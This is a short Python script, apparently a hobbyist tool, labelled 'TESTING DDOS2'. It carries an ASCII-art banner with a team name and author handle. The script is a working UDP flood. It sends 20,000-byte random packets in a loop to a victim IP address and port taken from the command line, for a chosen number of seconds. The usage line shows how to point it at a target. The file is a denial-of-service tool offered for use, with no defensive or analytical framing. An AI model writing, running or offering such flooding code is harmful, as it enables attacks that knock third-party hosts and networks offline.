import time
import socket
import random
import sys


def usage():
    print("""\033[0;36m""")
    print(""" ____  ____   ____  ____    ____  ____   ____     ___  ____      
|    ||    \ /    ||    \  /    ||    \ |    \   /  _]|    \     
 |  | |  o  )   __||  D  )|  o  ||  o  )|  o  ) /  [_ |  D  )    
 |  | |   _/|  |  ||    / |     ||     ||     ||    _]|    /     
 |  | |  |  |  |_ ||    \ |  _  ||  O  ||  O  ||   [_ |    \     
 |  | |  |  |     ||  .  \|  |  ||     ||     ||     ||  .  \    
|____||__|  |___,_||__|\_||__|__||_____||_____||_____||__|\_|    
                                                                 """)
    print ("\033[0;32mTeam name : PlXwFreeTeamHybern")
    print ("""___""")
    print ("\033[0;33m| Team name : PlXwFreeTeamHybern")
    print ("""||_|""")
    print ("\033[0;31m|")
    print ("""|_||Team name : PlXwFreeTeamHybern""")
    print ("\033[0;34m|")
    print ("""||-|Team name : PlXwFreeTeamHybern""")
    print ("\033[0;35m|")
    print ("""||_|Team name : PlXwFreeTeamHybern""")
    print ("\033[0;36m|_")
    print ("""|||""")
    print ("\033[0;37m|_Team name : PlXwFreeTeamHybern")
    print ("\033[0;31m|-")
    print ("""|||_""")
    print ("\033[0;36m|______|")
    print ("""|=============| TESTING DDOS2""")
    print ("Author : MR Noobking")
    print ("python3 TESTINGDDOS2.py (ip) (port) (turbo speed)")
def flood(victim, vport, duration):
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(20000)
        timeout = time.time() + duration
        sent = 5000

        while 1:
            if time.time() > timeout:
                break
            else:
                pass
            client.sendto(bytes, (victim, vport))
            sent = sent + 1
            print ("\033[0;31mStarting \033[0;34m%s \033[0;32mThe Flood Lmao \033[0;33m%s \033[0;36mthrough port \033[0;35m%s "%(sent, victim, vport))


def main():
    print (len(sys.argv))
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
